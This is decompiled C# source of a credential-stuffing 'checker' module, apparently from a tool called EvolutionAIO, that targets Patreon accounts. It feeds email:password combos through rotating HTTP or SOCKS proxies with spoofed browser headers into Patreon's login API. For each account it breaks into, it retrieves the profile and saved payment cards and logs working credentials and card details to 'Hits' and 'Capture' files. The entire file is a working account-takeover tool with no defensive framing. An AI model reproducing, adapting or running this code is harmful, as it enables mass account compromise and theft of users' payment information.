// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Patreon
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class Patreon
  {
    public static bool check(string[] s, string proxy)
    {
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          string str1 = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"},\"relationships\":{}}}";
          httpRequest.AddHeader("Host", "www.patreon.com");
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
          httpRequest.AddHeader("Accept", "*/*");
          httpRequest.AddHeader("Accept-Language", "en-GB,en;q=0.5");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
          httpRequest.AddHeader("Referer", "https://www.patreon.com/login");
          httpRequest.AddHeader("X-CSRF-Signature", "PlZOo9ZyuzwfV6N761m8C5Rcg6By70xvB3Qow4dhk8U");
          httpRequest.AddHeader("Content-Type", "application/vnd.api+json");
          httpRequest.AddHeader("Origin", "https://www.patreon.com");
          httpRequest.AddHeader("Content-Length", str1.Length.ToString());
          httpRequest.AddHeader("Connection", "keep-alive");
          HttpResponse httpResponse1 = httpRequest.Post("https://www.patreon.com/api/login", str1, "application/json");
          Save.AsResult(nameof (Patreon), "R", httpResponse1.ToString());
          if (httpResponse1.ToString().Contains("Incorrect email or password.") || !httpResponse1.ToString().Contains("created\":\""))
            return false;
          httpRequest.ClearAllHeaders();
          httpRequest.AddHeader("Host", "www.patreon.com");
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
          httpRequest.AddHeader("Accept", "*/*");
          httpRequest.AddHeader("Accept-Language", "en-GB,en;q=0.5");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
          httpRequest.AddHeader("Referer", "https://www.patreon.com/settings/profile");
          httpRequest.AddHeader("Content-Type", "application/vnd.api+json");
          httpRequest.AddHeader("Connection", "keep-alive");
          HttpResponse httpResponse2 = httpRequest.Get("https://www.patreon.com/api/current_user?include=connected_socials,campaign.connected_socials&json-api-version=1.0");
          Save.AsResult(nameof (Patreon), "R1", httpResponse2.ToString());
          Menu.Parse(httpResponse2.ToString(), "\"type\":\"", "\"");
          Menu.Parse(httpResponse2.ToString(), "created\":\"", "T");
          Menu.Parse(httpResponse2.ToString(), "full_name\":\"", "\"");
          httpRequest.AddHeader("Host", "www.patreon.com");
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
          httpRequest.AddHeader("Accept", "*/*");
          httpRequest.AddHeader("Accept-Language", "en-GB,en;q=0.5");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
          httpRequest.AddHeader("Referer", "https://www.patreon.com/pledges");
          httpRequest.AddHeader("Content-Type", "application/json");
          httpRequest.AddHeader("Connection", "keep-alive");
          HttpResponse httpResponse3 = httpRequest.Get("https://www.patreon.com/api/cards?include=pledges&fields[card]=number,expiration_date,card_type,merchant_name,needs_sfw_auth,needs_nsfw_auth&json-api-version=1.0");
          Save.AsResult(nameof (Patreon), "R2", httpResponse3.ToString());
          string str2 = Menu.Parse(httpResponse3.ToString(), "{\"data\":[", "]}");
          if (str2 != "")
          {
            ++Menu.hits;
            if (Menu.p1 == "2")
              Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Payment Method: " + str2);
            Save.AsResult(nameof (Patreon), "Hits", s[0] + ":" + s[1]);
            Save.AsResult(nameof (Patreon), "Capture", s[0] + ":" + s[1] + " | Payment Method: " + str2 + " ~ ");
          }
          else
            ++Menu.frees;
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        Save.AsResult(nameof (Patreon), "Errors", ex.ToString());
        ++Menu.errors;
      }
      return false;
    }
  }
}
